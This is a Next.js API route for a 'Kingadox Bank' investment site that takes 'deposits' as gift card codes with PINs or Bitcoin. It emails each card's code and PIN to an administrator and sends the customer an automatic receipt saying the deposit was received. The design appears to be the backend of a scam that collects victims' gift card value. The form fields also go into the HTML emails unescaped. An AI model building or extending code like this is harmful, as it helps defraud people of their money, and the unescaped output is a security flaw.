// app/api/send-deposit-email/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

interface DepositFormData {
  amount: string;
  paymentMethod: string;
  giftCardCode: string;
  giftCardPin: string;
  selectedGiftCard: string;
  fullName: string;
  accountNo: string;
  email: string;
}

interface EmailResult {
  success: boolean;
  messageId?: string;
  email?: string;
  error?: string;
}

export async function POST(request: Request) {
  try {
    const formData: DepositFormData = await request.json();

    console.log('🔔 Received deposit request');
    console.log('📧 Admin emails configured:', {
      ADMIN_EMAIL: process.env.ADMIN_EMAIL,
      SMTP_USER: process.env.SMTP_USER
    });

    // Send email notification to admin
    const adminResult = await sendAdminNotification(formData);

    console.log('📨 Admin email results:', adminResult);

    // Send confirmation email to customer
    const customerResult = await sendCustomerConfirmation(formData);

    console.log('📨 Customer email result:', customerResult);

    return NextResponse.json({
      success: true,
      message: 'Emails processed',
      adminEmail: adminResult,
      customerEmail: customerResult
    });

  } catch (error) {
    console.error('💥 Deposit processing error:', error);
    return NextResponse.json(
      { success: false, error: 'Failed to send emails: ' + (error as Error).message },
      { status: 500 }
    );
  }
}

// Send email to admin with deposit details
async function sendAdminNotification(formData: DepositFormData): Promise<EmailResult> {
  // Define adminEmail at the function scope level
  const adminEmail = process.env.ADMIN_EMAIL || process.env.SMTP_USER;
  
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    // Verify transporter configuration
    await transporter.verify();
    console.log('✅ SMTP transporter verified successfully');

    console.log('📧 Preparing to send admin email to:', adminEmail);

    const mailOptions = {
      from: `"Kingadox Investment System" <${process.env.SMTP_USER}>`,
      to: adminEmail,
      subject: `New Deposit Request - ${formData.fullName} (Acc: ${formData.accountNo})`,
      html: `
        <!DOCTYPE html>
        <html>
          <head>
            <style>
              body { 
                font-family: 'Arial', sans-serif; 
                background: #f3f4f6;
                margin: 0;
                padding: 20px;
              }
              .email-container {
                max-width: 700px;
                margin: 0 auto;
                background: white;
                border-radius: 10px;
                overflow: hidden;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
              }
              .header {
                background: #059669;
                padding: 25px;
                text-align: center;
                color: white;
              }
              .bank-logo {
                font-size: 24px;
                font-weight: bold;
                margin-bottom: 10px;
              }
              .content {
                padding: 30px;
              }
              .data-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 15px;
                margin: 20px 0;
              }
              .data-item {
                background: #f8fafc;
                padding: 15px;
                border-radius: 8px;
                border-left: 4px solid #3b82f6;
              }
              .data-label {
                font-weight: bold;
                color: #64748b;
                font-size: 12px;
                text-transform: uppercase;
              }
              .data-value {
                color: #1e293b;
                font-size: 16px;
                margin-top: 5px;
              }
              .giftcard-details {
                background: #f0fdf4;
                border-left: 4px solid #059669;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
              }
              .footer {
                background: #f1f5f9;
                padding: 20px;
                text-align: center;
                color: #64748b;
              }
            </style>
          </head>
          <body>
            <div class="email-container">
              <div class="header">
                <div class="bank-logo">Kingadox Bank - Admin Alert</div>
                <h2>New Deposit Request Received</h2>
              </div>
              <div class="content">
                <div class="giftcard-details">
                  <div class="data-label">DEPOSIT AMOUNT</div>
                  <div class="data-value" style="font-size: 20px; color: #059669; font-weight: bold;">
                    $${Number(formData.amount).toLocaleString()}
                  </div>
                  <div class="data-label">PAYMENT METHOD</div>
                  <div class="data-value" style="font-size: 16px; color: #059669; font-weight: bold;">
                    ${formData.paymentMethod === 'giftcard' ? `${formData.selectedGiftCard.toUpperCase()} Gift Card` : 'Bitcoin'}
                  </div>
                </div>

                <div class="data-grid">
                  <div class="data-item">
                    <div class="data-label">Full Name</div>
                    <div class="data-value">${formData.fullName}</div>
                  </div>
                  <div class="data-item">
                    <div class="data-label">Email</div>
                    <div class="data-value">${formData.email}</div>
                  </div>
                  <div class="data-item">
                    <div class="data-label">Account Number</div>
                    <div class="data-value" style="font-weight: bold;">${formData.accountNo}</div>
                  </div>
                  <div class="data-item">
                    <div class="data-label">Payment Method</div>
                    <div class="data-value">${formData.paymentMethod === 'giftcard' ? 'Gift Card' : 'Bitcoin'}</div>
                  </div>
                  ${formData.paymentMethod === 'giftcard' ? `
                  <div class="data-item">
                    <div class="data-label">Gift Card Type</div>
                    <div class="data-value">${formData.selectedGiftCard.toUpperCase()}</div>
                  </div>
                  <div class="data-item">
                    <div class="data-label">Gift Card Code</div>
                    <div class="data-value" style="font-family: monospace;">${formData.giftCardCode}</div>
                  </div>
                  <div class="data-item">
                    <div class="data-label">Gift Card PIN</div>
                    <div class="data-value" style="font-family: monospace;">${formData.giftCardPin}</div>
                  </div>
                  ` : ''}
                  <div class="data-item">
                    <div class="data-label">Submission Time</div>
                    <div class="data-value">${new Date().toLocaleString()}</div>
                  </div>
                </div>

                <p><strong>Action Required:</strong> Please process this deposit request in the admin portal.</p>
              </div>
              <div class="footer">
                <p>Kingadox Bank Admin System</p>
                <p>© 2024 Kingadox Bank. Confidential and Proprietary.</p>
              </div>
            </div>
          </body>
        </html>
      `,
    };

    const result = await transporter.sendMail(mailOptions);
    console.log('✅ Admin notification sent successfully to:', adminEmail);
    return { success: true, email: adminEmail, messageId: result.messageId };
  } catch (error) {
    console.error('❌ Error sending admin email:', (error as Error).message);
    return { success: false, email: adminEmail, error: (error as Error).message };
  }
}

// Send confirmation email to customer
async function sendCustomerConfirmation(formData: DepositFormData): Promise<EmailResult> {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    // Verify transporter configuration
    await transporter.verify();

    const mailOptions = {
      from: `"Kingadox Bank" <${process.env.SMTP_USER}>`,
      to: formData.email,
      subject: 'Your Deposit Request Has Been Received - Kingadox Bank',
      html: `
        <!DOCTYPE html>
        <html>
          <head>
            <style>
              body { 
                font-family: 'Arial', sans-serif; 
                background: linear-gradient(135deg, #059669 0%, #047857 100%);
                margin: 0;
                padding: 40px 20px;
              }
              .email-container {
                max-width: 600px;
                margin: 0 auto;
                background: white;
                border-radius: 15px;
                overflow: hidden;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
              }
              .header {
                background: linear-gradient(135deg, #065f46 0%, #047857 100%);
                padding: 30px;
                text-align: center;
                color: white;
              }
              .bank-logo {
                font-size: 28px;
                font-weight: bold;
                margin-bottom: 10px;
                color: #fbbf24;
              }
              .content {
                padding: 40px 30px;
                color: #374151;
              }
              .status-card {
                background: #f0fdf4;
                border-left: 4px solid #059669;
                padding: 20px;
                margin: 20px 0;
                border-radius: 8px;
              }
              .footer {
                background: #f8fafc;
                padding: 20px;
                text-align: center;
                color: #64748b;
                font-size: 14px;
              }
              .highlight {
                color: #065f46;
                font-weight: bold;
              }
              .details-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 10px;
                margin: 20px 0;
              }
              .detail-item {
                padding: 10px;
                background: #f8fafc;
                border-radius: 6px;
              }
            </style>
          </head>
          <body>
            <div class="email-container">
              <div class="header">
                <div class="bank-logo">Kingadox Bank</div>
                <h1>Deposit Request Received</h1>
              </div>
              <div class="content">
                <p>Dear <span class="highlight">${formData.fullName}</span>,</p>
                
                <div class="status-card">
                  <h3>✅ Deposit Successfully Received</h3>
                  <p>We've received your deposit request and it's currently being processed.</p>
                </div>

                <p><strong>Deposit Details:</strong></p>
                <div class="details-grid">
                  <div class="detail-item">
                    <strong>Amount:</strong><br>
                    $${Number(formData.amount).toLocaleString()}
                  </div>
                  <div class="detail-item">
                    <strong>Payment Method:</strong><br>
                    ${formData.paymentMethod === 'giftcard' ? `${formData.selectedGiftCard.toUpperCase()} Gift Card` : 'Bitcoin'}
                  </div>
                  <div class="detail-item">
                    <strong>Account:</strong><br>
                    ${formData.accountNo || 'To be assigned'}
                  </div>
                  <div class="detail-item">
                    <strong>Reference:</strong><br>
                    DEP-${Date.now().toString().slice(-8)}
                  </div>
                </div>

                ${formData.paymentMethod === 'giftcard' ? `
                <div class="status-card" style="background: #fffbeb; border-left: 4px solid #f59e0b;">
                  <h3>🎁 Gift Card Processing</h3>
                  <p>Your ${formData.selectedGiftCard.toUpperCase()} gift card is being verified. This process usually takes 1-2 business hours.</p>
                </div>
                ` : `
                <div class="status-card" style="background: #f0f9ff; border-left: 4px solid #3b82f6;">
                  <h3>₿ Bitcoin Processing</h3>
                  <p>Please contact our support team to complete your Bitcoin deposit. Funds will be credited after 3 network confirmations.</p>
                </div>
                `}

                <p>You will receive another email once your funds have been credited to your account.</p>
              </div>
              <div class="footer">
                <p>Kingadox Bank & Trust</p>
                <p>Customer Service: +1 (555) 123-KING</p>
                <p>© 2024 Kingadox Bank. All rights reserved.</p>
              </div>
            </div>
          </body>
        </html>
      `,
    };

    const result = await transporter.sendMail(mailOptions);
    console.log('✅ Customer confirmation sent successfully to:', formData.email);
    return { success: true, messageId: result.messageId };
  } catch (error) {
    console.error('❌ Error sending customer email:', error);
    return { success: false, error: (error as Error).message };
  }
}